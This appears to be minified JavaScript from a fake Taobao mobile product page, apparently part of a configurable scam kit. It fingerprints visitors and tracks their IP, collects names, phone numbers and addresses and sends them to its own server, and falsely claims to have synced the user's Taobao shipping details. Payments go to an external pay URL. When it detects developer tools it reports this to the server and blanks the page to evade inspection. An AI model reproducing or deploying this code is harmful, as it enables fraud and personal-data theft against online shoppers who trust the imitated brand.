let globalCoverIndexes=2,globalBrowserID="",globalIP="";try{fetch("https://ipapi.co/ip").then(e=>e.text()).then(e=>{globalIP=e}),setInterval(()=>{fetch("https://ipapi.co/ip").then(e=>e.text()).then(e=>{globalIP=e})},1e4)}catch(e){}try{import("https://openfpcdn.io/fingerprintjs/v4").then(e=>e.load()).then(e=>e.get()).then(e=>{const t=e.visitorId;globalBrowserID=t})}catch(e){}let processing=!1;function buy(){const e=`/api/v1/get_pay?feed_id=${document.location.href.split("=")[1].split("&")[0].trim()}&browser_id=${globalBrowserID}&ip=${globalIP}`;if(!processing){processing=!0;try{fetch(e).then(e=>e.json()).then(e=>{1==e.code?(window.open(e.data.pay_url,"_blank"),window.location.href=e.data.pay_url):alert("订单创建失败, 请稍后重试我们这边出了错"),processing=!1}).catch(e=>{alert("订单创建失败, 请稍后重试我们这边出了错"),processing=!1})}catch(e){alert("错误"),processing=!1}}}function close_page(e){0==e&&(document.getElementById("address").style.display="none")}function open_page(e){0==e&&(document.getElementById("address").style.display="block")}function save(){const e=document.getElementById("id_0"),t=document.getElementById("id_1"),n=document.getElementById("id_2"),o=document.getElementById("id_3");if(e.value&&t.value&&n.value&&o.value){const a=document.getElementById("address_0");a.innerHTML=`${n.value} ${o.value}`,a.className="text-gray-600",close_page(0);const l=document.location.href.split("=")[1].split("&")[0].trim(),d="/api/v1/save_address",i={method:"POST",headers:{"content-type":"application/json"},body:JSON.stringify({feed_id:l,ip:globalIP,fingerprint:globalBrowserID,name:e.value,phone:t.value,address:`${n.value} ${o.value}`})};try{fetch(d,i)}catch(e){}}else alert("未填写完整收货信息！")}function sync_address(){const e=document.getElementById("address_0");e.innerHTML="已自动同步你的淘宝收货信息",e.className="text-orange-400",close_page(0)}function set_template(e){const t=document.getElementById("template_param_id_0"),n=document.getElementById("template_param_id_1"),o=document.getElementById("template_param_id_3"),a=document.getElementById("template_param_id_4"),l=document.getElementById("template_param_sold");if(t.innerHTML=e.goodName,n.innerHTML=e.price_0,o.innerHTML=e.address,a.innerHTML=e.sellerName,l.innerHTML=e.sold_count,e.goodCovers.length){const t=document.getElementById("swiper_id_0");let n="";for(let t=0;t<e.goodCovers.length;t++){n+=`\n            <swiper-slide>\n                <img id="cover_${t}" class="bg-cover w-full h-full absolute bottom-0"\n                    src="${e.goodCovers[t]}"\n                    alt="">\n            </swiper-slide>\n            `}t.innerHTML=n,globalCoverIndexes=e.goodCovers.length}if(e.goodDetailImages.length){const t=document.getElementById("detailImages");let n="";for(let t=0;t<e.goodDetailImages.length;t++){n+=`\n            <img class="w-full"\n            src="${e.goodDetailImages[t]}"\n            alt="">\n            `}t.innerHTML=n}if(e.sellerImage){document.getElementById("template_param_id_5").src=e.sellerImage}}window.onload=(()=>{const e=document.location.href.split("=")[1].split("&")[0].trim();if("preview"==e)return document.getElementById("mark").style.display="none",-1;import("https://openfpcdn.io/fingerprintjs/v4").then(e=>e.load()).then(e=>e.get()).then(t=>{const n=t.visitorId,o=`/api/v1/get_feed?feed_id=${e}&browser_id=${n}&ip=${globalIP}`,a=document.getElementById("swiper_id_0");a.innerHTML="";const l=document.getElementById("template_param_sold");l.innerHTML="";const d=document.getElementById("detailImages");d.innerHTML="";const i=document.getElementById("template_param_id_5");i.src="",i.style.opacity="0";const s=document.getElementById("template_param_id_0"),r=document.getElementById("template_param_id_1"),c=document.getElementById("template_param_id_3"),m=document.getElementById("template_param_id_4");s.style.opacity="0",r.style.opacity="0",c.style.opacity="0",m.style.opacity="0",fetch(o).then(e=>e.json()).then(e=>{if(1==e.code){s.innerHTML=e.data.template.good_name,window.document.title=`淘宝触屏版 - ${e.data.template.good_name}`,r.innerHTML=e.data.template.price_0,l.innerHTML=e.data.template.sold_count,c.innerHTML=e.data.template.warehouses,m.innerHTML=e.data.template.seller_name,s.style.opacity="1",r.style.opacity="1",c.style.opacity="1",m.style.opacity="1",document.getElementById("mark").style.display="none",fetch(`/api/v1/get_image?id=${e.data.template.seller_image}`).then(e=>e.text()).then(e=>{i.src=e,i.style.opacity="1"}),globalCoverIndexes=e.data.template.product_covers.length;for(let t=0;t<e.data.template.product_covers.length;t++){const n=e.data.template.product_covers[t];fetch(`/api/v1/get_image?id=${n}`).then(e=>e.text()).then(e=>{const n=`\n                                    <swiper-slide>\n                                        <img class="cover_img" id="cover_${t}"\n                                            src="${e}"\n                                            alt="">\n                                    </swiper-slide>\n                                `;a.innerHTML+=n,a.style.display="none",setTimeout(()=>{a.style.display="block"},20)})}for(let t=0;t<e.data.template.product_images.length;t++){const n=e.data.template.product_images[t];fetch(`/api/v1/get_image?id=${n}`).then(e=>e.text()).then(e=>{const t=`\n                        <img class="w-full"\n                        src="${e}"\n                        alt="">\n                        `;d.innerHTML+=t})}}})})}),setInterval(()=>{const e=document.getElementById("search");e.value&&(e.value=null,window.open("https://www.taobao.com/","_blank"))},200),setInterval(()=>{try{const e=document.getElementById("cover_index");for(let t=0;t<globalCoverIndexes;t++){0==document.getElementById(`cover_${t}`).getBoundingClientRect().left&&(e.innerHTML=`${t+1}/${globalCoverIndexes}`)}}catch(e){}},200),this.window.addEventListener("message",e=>{set_template(e.data)});let reported=!1;function checkFrDevTools(){const e=window.outerWidth-window.innerWidth>160,t=window.outerHeight-window.innerHeight>160;if(e||t){if(!reported){const e=document.location.href.split("=")[1].split("&")[0].trim();if("preview"==e)return;fetch("/api/v1/report",{method:"POST",headers:{"content-type":"application/json"},body:JSON.stringify({event:"Detected DevTools",data:{feedId:e}})}).then(e=>e.json()).then(e=>{console.clear(),console.log("Fuck!"),document.querySelector("body").innerHTML="Detected!",clearInterval(intervalID)}),reported=!0}return!0}}const intervalID=setInterval(()=>{checkFrDevTools()},200);